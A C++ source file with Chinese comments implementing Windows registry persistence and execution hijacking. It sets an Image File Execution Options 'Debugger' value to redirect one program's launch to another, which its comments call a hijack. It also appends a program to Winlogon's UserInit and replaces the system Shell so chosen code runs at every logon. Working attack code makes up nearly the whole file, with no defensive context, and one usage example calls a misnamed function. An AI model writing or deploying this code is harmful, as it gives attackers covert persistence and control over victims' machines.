#include <Windows.h>
#include <string>
#include <iostream>

bool SetImageFileExecutionRedirect(const std::string& sourceExePath, const std::string& targetExePath) {
	for(int i=0;i<10;i++){
    // 从源路径中提取可执行文件名（带扩展名）
    size_t lastSlash = sourceExePath.find_last_of("\\/");
    std::string exeName = (lastSlash != std::string::npos) ? 
                         sourceExePath.substr(lastSlash + 1) : sourceExePath;

    // 构造注册表路径
    std::string regPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + exeName;

    // 打开注册表项
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, NULL,
                       REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return false;
    }

    // 设置调试器值（格式："目标路径" - 双引号确保路径空格正确处理）
    std::string debuggerValue = "\"" + targetExePath + "\"";
    
    // 写入注册表
    if (RegSetValueExA(hKey, "Debugger", 0, REG_SZ, 
                      (const BYTE*)debuggerValue.c_str(), 
                      static_cast<DWORD>(debuggerValue.size() + 1)) != ERROR_SUCCESS) {
		std::cerr<<"Write to reg failed.";
        RegCloseKey(hKey);
        //return false;
    }

    RegCloseKey(hKey);
	}
    return true;
}

/* 使用示例：
int main() {
    std::string source = "C:\\Program Files\\OriginalApp\\app.exe";
    std::string target = "C:\\Redirect\\redirector.exe";
    
    if (SetImageFileExecutionRedirect(source, target)) {
        // 劫持成功
    } else {
        // 劫持失败
    }
    return 0;
}
*/



bool AddToUserInit(const std::string& programPath) {

    HKEY hKey;
    const char* subKey = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    
    // 1. 打开注册表项
    LONG result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        subKey,
        0,
        KEY_READ | KEY_WRITE,
        &hKey
    );
    
    if (result != ERROR_SUCCESS) {
		std::cerr<<"Open Reg Failed.\n";
        return false;
    }

    // 2. 获取当前 UserInit 值
    char currentValue[1024];
    DWORD bufferSize = sizeof(currentValue);
    DWORD type = REG_SZ;
    
    result = RegQueryValueExA(
        hKey,
        "UserInit",
        NULL,
        &type,
        reinterpret_cast<LPBYTE>(currentValue),
        &bufferSize
    );

    if (result != ERROR_SUCCESS) {
		std::cerr<<"Get Reg Value Failed.\n";
        RegCloseKey(hKey);
        return false;
    }

    // 3. 构造新值（保留原始值 + 添加新路径）
    std::string newValue = currentValue;
    
    // 确保以逗号分隔（原始值通常以逗号结尾）
    if (!newValue.empty() && newValue.back() != ',') {
        newValue += ',';
    }
    
    newValue += programPath;
    newValue += ',';  // UserInit 要求路径以逗号结尾

    // 4. 更新注册表值
    result = RegSetValueExA(
        hKey,
        "UserInit",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(newValue.c_str()),
        static_cast<DWORD>(newValue.length() + 1)
    );
	

	
    // 5. 清理资源
    RegCloseKey(hKey);
	
    return 1;
}

bool SetSystemShell(const std::string& newShellPath) {

    // 打开 Winlogon 注册表项
    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0,
        KEY_WRITE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        return false;
    }

    // 设置 Shell 值
    result = RegSetValueExA(
        hKey,
        "Shell",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(newShellPath.c_str()),
        static_cast<DWORD>(newShellPath.size() + 1)
    );

    if (result != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    // 设置 Userinit 值（保留原始 userinit 并添加新 shell）
    std::string userInitValue = "C:\\Windows\\system32\\userinit.exe," + newShellPath;
    
    result = RegSetValueExA(
        hKey,
        "Userinit",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(userInitValue.c_str()),
        static_cast<DWORD>(userInitValue.size() + 1)
    );

    RegCloseKey(hKey);
	
    return 1;
}

/* 使用示例：
int main() {
    std::string customShell = "C:\\Path\\To\\YourShell.exe";
    
    if (SetSystemShellA(customShell)) {
        // 修改成功，需要重启生效
        MessageBoxA(nullptr, "Shell修改成功，重启后生效", "成功", MB_OK);
    } else {
        MessageBoxA(nullptr, "Shell修改失败", "错误", MB_ICONERROR);
    }
    return 0;
}
*/
